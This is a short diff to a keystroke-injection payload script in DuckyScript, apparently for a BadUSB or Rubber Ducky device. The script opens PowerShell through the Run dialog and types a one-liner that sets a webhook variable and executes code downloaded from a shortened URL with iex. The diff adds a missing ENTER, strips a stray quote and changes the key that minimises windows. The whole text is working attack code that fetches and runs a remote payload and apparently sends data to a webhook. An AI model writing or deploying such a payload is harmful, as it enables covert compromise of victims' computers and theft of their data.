@@ -14,10 +14,12 @@ GUI r
 DELAY 750
 STRING powershell 
 DELAY 300
-STRING $dc='WEBHOOK_LINK';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('https://is.gd/jciHTz')"
+ENTER
+DELAY 750
+STRING $dc='WEBHOOK_LINK';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('https://is.gd/jciHTz')
 DELAY 300
 ENTER
 DELAY 300
-WIN m
+GUI m
 DELAY 300
 ESC
